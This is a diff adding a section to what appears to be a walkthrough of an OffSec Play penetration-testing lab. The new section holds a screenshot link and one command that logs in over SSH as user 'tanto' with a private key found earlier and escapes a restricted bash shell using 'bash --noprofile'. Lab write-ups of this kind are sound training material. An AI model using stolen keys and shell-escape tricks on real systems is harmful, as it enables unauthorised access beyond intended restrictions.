@@ -512,3 +512,11 @@ SSH as Tanto
 ```
 Found SSH keys earlier
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/52abebd5-5f74-48db-b56f-8662da5681ef)
+
+Restricted Bash
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/90dd9309-b26b-4acb-9159-e6549e7287bc)
+
+Breaking out of Restricted Bash Shell
+```
+> ssh -i id_rsa tanto@192.168.241.90 -t "bash --noprofile"
+```
